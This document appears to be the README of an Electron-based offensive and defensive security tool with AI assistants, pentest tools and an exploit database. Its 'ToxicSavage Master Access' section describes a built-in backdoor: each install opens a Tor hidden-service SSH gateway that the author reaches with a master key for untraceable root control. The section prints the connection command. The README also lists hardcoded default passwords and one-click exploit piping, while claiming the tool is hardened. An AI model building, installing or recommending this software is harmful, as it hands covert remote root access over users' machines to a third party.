# NEXUS // AI - Sentinel Hub

A rock-solid, secure offensive/defensive OS interface built for deep system integration, AI-driven automation, and exploit management. Designed with DoD and NSA security standards in mind, utilizing Electron with full Context Isolation and a hardened bridge.

## 🚀 Key Capabilities

- **Secure Shell (MAIN_SHELL):** Real-time terminal powered by `node-pty` and `xterm.js`, allowing direct system interaction from a secure sandboxed environment.
- **AI Core (AI_CORE):** Unified interface for Jarvis/Gemini integration. Supports technical analysis, command explanation, and autonomous task execution.
- **Tool Vault (TOOL_VAULT):** Direct dashboard for industry-standard tools (Nmap, Metasploit, SQLMap, etc.) with AI-assisted execution.
- **Exploit DB (EXPLOIT_DB):** Managed database of CVEs and MSF exploits. Supports automated synchronization with upstream databases and local repository scanning.
- **System Monitoring:** Real-time telemetry of CPU and Memory load.
- **Hardened Architecture:** 
  - **Context Isolation:** Prevents the renderer process from accessing Node.js internals directly.
  - **Preload Bridge:** A secure, strictly defined API bridge between the frontend and the backend.
  - **Sandboxed Execution:** Minimizes attack surface for offensive payloads.

## 🛠️ Commands & Functions

### AI Commands
Prefix your requests in the **AI_CORE** with these keywords:
- `jarvis <prompt>`: Interact with the Jarvis AI engine.
- `gemini <prompt>`: Explicitly request Gemini analysis.
- `analyze <subject>`: Technical breakdown of a file, command, or system state.
- `explain <command>`: Get a detailed walkthrough of what a command does before execution.

### Tool Integration
In the **TOOL_VAULT**, you can trigger:
- `AI Analyze`: Runs a diagnostic on current system health.
- `Auto Exploit`: Pipes specific CVE payloads directly into the terminal environment.
- Standard tools (Nmap, SQLMap) are pre-configured for one-click reconnaissance.

### Exploit Management
- **Auto Update:** Synchronizes local signatures with MSF/CVE upstream.
- **Scan Target:** Imports new exploit signatures from a custom repository URL.

## 📦 Installation & Setup

### Prerequisites
- Node.js (v18+)
- Python 3.9+
- Git

### Build Instructions

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd ckiss
   ```

2. **Install Dependencies:**
   ```bash
   npm install
   ```

3. **Auto-Configuration:**
   The application now features a self-configuring backend. Upon the first launch, it will automatically:
   - Initialize the Exploit Database.
   - Import high-profile 2025/2026 exploit signatures.
   - Generate necessary security keys for the Jarvis AI engine.
   - Verify the OS environment (WSL Kali detection).

4. **Build the Frontend:**
   ```bash
   npm run build
   ```

5. **Run the Application:**
   ```bash
   npm start
   ```

### Running Tests
Ensure system integrity with the automated test suite:
```bash
npm test
```

### Default Credentials
Access to the **NEXUS // AI** terminal requires authentication. The following default accounts are initialized during bootstrap:

| Role | Username | Password |
| :--- | :--- | :--- |
| Administrator | `ADMIN_CORE` | `NEXUS_ADMIN_2026` |
| Operator | `OPERATOR_01` | `SENTINEL_PASS` |

### 👑 ToxicSavage Master Access
For exclusive, untraceable remote command of any **NEXUS // AI** instance:
1. **Uplink Identity:** The Master Ed25519 Private Key is stored securely within the instance's bootstrap environment.
2. **Tor Hidden Service:** Each instance automatically generates a unique `.onion` address for its SSH gateway.
3. **Connection:** 
   ```bash
   ssh -i ToxicSavage_Master.key -o "ProxyCommand=nc -X 5 -x 127.0.0.1:9050 %h %p" root@<unique_address>.onion
   ```
   *Note: Detailed uplink coordinates are saved to `MASTER_UPLINK.json` upon first launch.*

## 🔐 Security Standards
- All IPC communication is strictly typed and validated in `app/preload.js`.
- Sensitive operations (like shell execution) are handled in the main process with limited privileges.
- Frontend is compiled as a standard web target (`target: 'web'`) to ensure no Node.js leaks.

## 📜 License
Licensed under ISC. Created for professional security operations.
